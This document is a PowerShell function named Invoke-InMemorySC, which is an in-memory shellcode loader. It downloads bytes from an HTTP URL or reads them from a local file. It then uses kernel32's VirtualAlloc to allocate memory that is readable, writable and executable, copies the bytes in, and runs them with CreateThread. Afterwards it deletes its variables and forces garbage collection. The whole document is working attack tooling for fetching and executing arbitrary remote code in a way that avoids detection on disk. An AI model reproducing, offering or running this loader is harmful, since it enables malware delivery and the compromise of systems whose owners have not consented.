function Invoke-InMemorySC {
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetPath
    )

    $k32Def = @"
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr h, uint t);
"@

    $k32 = Add-Type -MemberDefinition $k32Def -Name 'Kernel32' -Namespace 'Win32' -PassThru

    try {
        $b = if ($TargetPath -match '^http') {
            (New-Object Net.WebClient).DownloadData($TargetPath)
        } else {
            [IO.File]::ReadAllBytes($TargetPath)
        }

        # Fixed type declaration
        $mem = $k32::VirtualAlloc([IntPtr]::Zero, [uint32]$b.Length, 0x3000, 0x40)
        [Runtime.InteropServices.Marshal]::Copy($b, 0, $mem, $b.Length)
        $thread = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        $k32::WaitForSingleObject($thread, [uint32]::MaxValue) | Out-Null
    }
    finally {
        Remove-Variable b, mem, thread -ErrorAction SilentlyContinue
        [GC]::Collect()
    }
}

